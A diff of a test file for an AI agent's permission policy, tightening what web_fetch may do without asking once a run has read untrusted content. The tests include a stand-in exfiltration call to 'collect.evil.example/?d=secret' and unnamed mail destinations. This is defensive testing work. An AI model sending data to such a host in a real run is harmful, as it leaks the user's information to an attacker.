@@ -163,13 +163,15 @@ describe("tainted runs (S2-03, S2-04, S2-05)", () => {
     expect(decision.action === "ask" && decision.card.unnamedDestinations).toEqual(["evilann@example.com", "xann@example.com"]);
   });
 
-  test("web_fetch in a tainted run runs for a site the owner named and asks for any other", () => {
+  test("web_fetch in a tainted run runs for the page the owner named and asks for anything else (F3)", () => {
     const run = tainted(rig.another({ ownerText: ["look at https://docs.example.org/guide for me"] }));
-    expect(act(run, "web_fetch", { url: "https://docs.example.org/page?q=1" }).action).toBe("run");
-    expect(act(run, "web_fetch", { url: "https://api.docs.example.org/x" }).action).toBe("run");
+    expect(act(run, "web_fetch", { url: "https://docs.example.org/guide" }).action).toBe("run");
+    // Another page, a query or a subdomain of the named host could carry what the run read: they ask.
+    expect(act(run, "web_fetch", { url: "https://docs.example.org/page?q=1" }).action).toBe("ask");
+    expect(act(run, "web_fetch", { url: "https://api.docs.example.org/x" }).action).toBe("ask");
     const other = act(run, "web_fetch", { url: "https://collect.evil.example/?d=secret" });
     expect(other.action).toBe("ask");
-    if (other.action === "ask") expect(other.card.unnamedDestinations).toEqual(["collect.evil.example"]);
+    if (other.action === "ask") expect(other.card.unnamedDestinations).toEqual(["https://collect.evil.example/?d=secret"]);
     // The same call in a clean run needs nothing.
     expect(act(rig.run, "web_fetch", { url: "https://collect.evil.example/?d=secret" }).action).toBe("run");
   });
